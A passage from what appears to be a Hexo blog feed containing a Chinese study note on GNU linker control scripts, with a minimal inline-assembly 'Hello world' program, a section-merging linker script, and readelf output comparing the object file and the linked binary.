class="number">0x0000000000002008</span> <span class="number">0x0000000000002008</span></span><br><span class="line">                 <span class="number">0x0000000000000034</span> <span class="number">0x0000000000000034</span>  R      <span class="number">0x4</span></span><br><span class="line">  GNU_STACK      <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span></span><br><span class="line">                 <span class="number">0x0000000000000000</span> <span class="number">0x0000000000000000</span>  RW     <span class="number">0x10</span></span><br><span class="line">  GNU_RELRO      <span class="number">0x0000000000002db8</span> <span class="number">0x0000000000003db8</span> <span class="number">0x0000000000003db8</span></span><br><span class="line">                 <span class="number">0x0000000000000248</span> <span class="number">0x0000000000000248</span>  R      <span class="number">0x1</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title>链接控制脚本</title>
    <url>/2024/08/16/%E9%93%BE%E6%8E%A5%E6%8E%A7%E5%88%B6%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<p>链接器作为一个程序可以精细的控制其的连接过程，学习过段的合并过程，在学习一下如何控制，以写一个比较小的玩具程序作为学习主线。</p>
<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><blockquote>
<p>本次实验用的write</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@L:/usr/include/x86_64-linux-gnu/asm# <span class="built_in">cat</span> unistd_64.h</span><br><span class="line"><span class="comment">#ifndef _ASM_UNISTD_64_H</span></span><br><span class="line"><span class="comment">#define _ASM_UNISTD_64_H</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define __NR_read 0</span></span><br><span class="line"><span class="comment">#define __NR_write 1</span></span><br><span class="line"><span class="comment">#define __NR_open 2</span></span><br><span class="line"><span class="comment">#define __NR_close 3</span></span><br></pre></td></tr></table></figure>

<h1 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h1><blockquote>
<p>因为程序结束后会ret到非法地址，我也不想去给他写exit了，知道怎么会是就行了</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* str = <span class="string">&quot;Hello world!\n\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;movq $13,%rdx\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq $1,%rdi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq (str),%rsi\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;movq $1,%rax\n\t&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall\n\t&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        print();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">root@L:/home/l/c++<span class="meta"># gcc  -nostdlib -fno-exceptions -fno-unwind-tables -fno-stack-protector -fno-common -c minihello.c -o min.o</span></span><br><span class="line">root@L:/home/l/c++<span class="meta"># ld -static -e main -o min min.o</span></span><br><span class="line">root@L:/home/l/c++# ./min</span><br><span class="line">Hello world!</span><br><span class="line">Segmentation fault</span><br><span class="line">root@L:/home/l/c++# ./minds</span><br><span class="line">Hello world!</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<h2 id="链接脚本"><a href="#链接脚本" class="headerlink" title="链接脚本"></a>链接脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTRY(main)</span><br><span class="line">SECTIONS</span><br><span class="line">&#123;</span><br><span class="line">    mintext : &#123;*(.text) *(.data) *(.rodata)&#125;</span><br><span class="line">    /DISCARD/ : &#123;*(.comment) *(.strtab)&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="差异对比"><a href="#差异对比" class="headerlink" title="差异对比"></a>差异对比</h2><blockquote>
<p>可以看出合并之后少了好几个段</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++# readelf -S minds</span><br><span class="line">There are 8 section headers, starting at offset 0x11b8:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .note.gnu.pr[...] NOTE             0000000000000000  00001000</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 2] .eh_frame         PROGBITS         0000000000000020  00001020</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] mintext           PROGBITS         0000000000000078  00001078</span><br><span class="line">       000000000000004e  0000000000000000 WAX       0     0     1</span><br><span class="line">  [ 4] .data.rel.local   PROGBITS         00000000000000c8  000010c8</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 5] .symtab           SYMTAB           0000000000000000  000010d0</span><br><span class="line">       0000000000000078  0000000000000018           6     2     8</span><br><span class="line">  [ 6] .strtab           STRTAB           0000000000000000  00001148</span><br><span class="line">       000000000000001c  0000000000000000           0     0     1</span><br><span class="line">  [ 7] .shstrtab         STRTAB           0000000000000000  00001164</span><br><span class="line">       0000000000000050  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br><span class="line">root@L:/home/l/c++# readelf -S min.o</span><br><span class="line">There are 16 section headers, starting at offset 0x310:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .text             PROGBITS         0000000000000000  00000040</span><br><span class="line">       000000000000003f  0000000000000000  AX       0     0     1</span><br><span class="line">  [ 2] .rela.text        RELA             0000000000000000  00000208</span><br><span class="line">       0000000000000030  0000000000000018   I      13     1     8</span><br><span class="line">  [ 3] .data             PROGBITS         0000000000000000  0000007f</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 4] .bss              NOBITS           0000000000000000  0000007f</span><br><span class="line">       0000000000000000  0000000000000000  WA       0     0     1</span><br><span class="line">  [ 5] .rodata           PROGBITS         0000000000000000  0000007f</span><br><span class="line">       000000000000000f  0000000000000000   A       0     0     1</span><br><span class="line">  [ 6] .data.rel.local   PROGBITS         0000000000000000  00000090</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     8</span><br><span class="line">  [ 7] .rela.data.r[...] RELA             0000000000000000  00000238</span><br><span class="line">       0000000000000018  0000000000000018   I      13     6     8</span><br><span class="line">  [ 8] .comment          PROGBITS         0000000000000000  00000098</span><br><span class="line">       000000000000002c  0000000000000001  MS       0     0     1</span><br><span class="line">  [ 9] .note.GNU-stack   PROGBITS         0000000000000000  000000c4</span><br><span class="line">       0000000000000000  0000000000000000           0     0     1</span><br><span class="line">  [10] .note.gnu.pr[...] NOTE             0000000000000000  000000c8</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [11] .eh_frame         PROGBITS         0000000000000000  000000e8</span><br><span class="line">       0000000000000058  0000000000000000   A       0     0     8</span><br><span class="line">  [12] .rela.eh_frame    RELA             0000000000000000  00000250</span><br><span class="line">       0000000000000030  0000000000000018   I      13    11     8</span><br><span class="line">  [13] .symtab           SYMTAB           0000000000000000  00000140</span><br><span class="line">       00000000000000a8  0000000000000018          14     4     8</span><br><span class="line">  [14] .strtab           STRTAB           0000000000000000  000001e8</span><br><span class="line">       000000000000001c  0000000000000000           0     0     1</span><br><span class="line">  [15] .shstrtab         STRTAB           0000000000000000  00000280</span><br><span class="line">       0000000000000089  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>cs</category>
        <category>读书笔记</category>
        <category>ELF</category>
      </categories>
      <tags>
        <tag>gcc</tag>
        <tag>linker</tag>
        <tag>elf</tag>
      </tags>
  </entry>
</search>
